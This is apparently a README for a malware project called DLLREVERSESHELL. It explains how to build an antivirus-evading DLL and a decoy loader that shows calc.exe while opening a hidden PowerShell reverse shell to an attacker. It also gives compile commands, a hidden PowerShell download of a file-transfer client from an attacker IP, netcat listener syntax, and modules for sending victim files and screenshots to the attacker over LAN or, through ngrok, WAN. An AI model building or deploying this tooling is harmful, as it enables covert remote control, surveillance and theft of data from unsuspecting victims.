# DLLREVERSESHELL
<b>A CUSTOM CODED FUD DLL, CODED IN C , WHEN LOADED , VIA A DECOY WEB-DELIVERY MODULE( FIRING A DECOY PROGRAM), WILL GIVE A REVERSE SHELL (POWERSHELL) FROM THE VICTIM MACHINE TO THE ATTACKER CONSOLE , OVER LAN AND WAN.
</b>

The project comprises of:


<p><b>. A custom C header file, mingwdll.h </b></p>
<p><b>. The DLL C code mingw_dll.c </b></p>
<p><b>. The Loader file loader.c , that will invoke a web delivery of the DLL ,to the target machine, load the DLL in the runtime, producing the decoy program for the victim on the foreground, and spawning a connect back reverse shell (powershell) to the attacker, in the back ground </b></p>

<p><b><i> Phase 1 : </b></i></p>

Place the mingwdll.h and mingw_dll.c in the same folder and compile using :

<b>i686-w64-mingw32-gcc -Wall -shared mingw_dll.c -o calc_helper.dll -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc </b>

This will create the FUD DLL <b> calc_helper.dll </b>

File Description:
<b> root@nautilus:~/Desktop/c_code/dll_rsh# file calc_helper.dll
calc_helper.dll: PE32 executable (DLL) (console) Intel 80386 (stripped to external PDB), for MS Windows
</b>

<p><b><i> Phase 2 : </b></i></p>
Compile the loader.c using <b> i686-w64-mingw32-gcc loader.c -o improved_calc.exe </b>
This will create the PE32 executable improved_calc.exe.

File Description:
<b>improved_calc.exe: PE32 executable (console) Intel 80386, for MS Windows </b>

When the file improved_calc.exe , it might initially throw a Dll load error, thus I have ensured that a second call to regsvr32 is made post a _sleep() function, to ensure the DLL load on runtime.

Post the DLL is loaded , it will fire the decoy , calc.exe and spawn a reverse shell, (netcat listener on port 8080 as defined in the header file { nc -lvp 8080 } ) 

Cheers

#Captain_Nemo

# DLLREVERSESHELL

<b><p>https://youtu.be/HR0C_2_UAT8</p></b>


# POST EXPLOITATION MODULE

I have added a post exploitation module for file transfer , from the Victim machine to the Attacker machine.

Compile the C program , ft_clie.c using 

<p><b>i686-w64-mingw32-gcc ft_clie.c -o client_ft.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
 </p></b>
 
 
 This is webdelivered to the victim , through the newly incorporated system() function call system("start powershell -windowstyle Hidden Invoke-WebRequest -Uri 'http://192.168.225.196/client_ft.exe' -OutFile 'client_ft.exe'"); , in loader.c 
 
 <p><b> 
  syntax to run client_ft.exe : 
  
  .\client_ft.exe ss.txt 192.168.225.196 4444
  
  or
  
  .\client_ft.exe filename attackerip attackerport
  
  from the reverse shell
  </p></b>
  
  <p><b>
  In the mean while , compile the serverfiletransfer.c using 
  gcc serverfiletransfer.c -o serv 
  
  Syntax: ./serv localattackerip chosenport
  or 
  ./serv 192.168.225.196 4444
  
 </p></b>
 
 <p>
 Once the reverse shell is obtained, ready the server using ./serv <localattackerip> <chosenport>  on a Linux terminal and on the Reverseshell , execute  .\client_ft.exe <filename> <attackerip> <attackerport> , to transfer files from the victim to the atacker machine. 
  This exploit can be leveraged to WAN using ngrok.
  </p>
  
  <b>https://youtu.be/KJOwew96pqw</b>
  
  # POST EXPLOITATION MODULE

<p><b>
The Screenshot module , (screenshot.cpp) , will take screenshots of the remote machine and the .bmp files can be transferred over lan / wan to the attacker machine.
</p></b>

<p><b>
 Compilation Instruction: i686-w64-mingw32-g++ screenshot.cpp -o ss.exe -static-libstdc++ -static-libgcc -lgdi32
 </p></b>
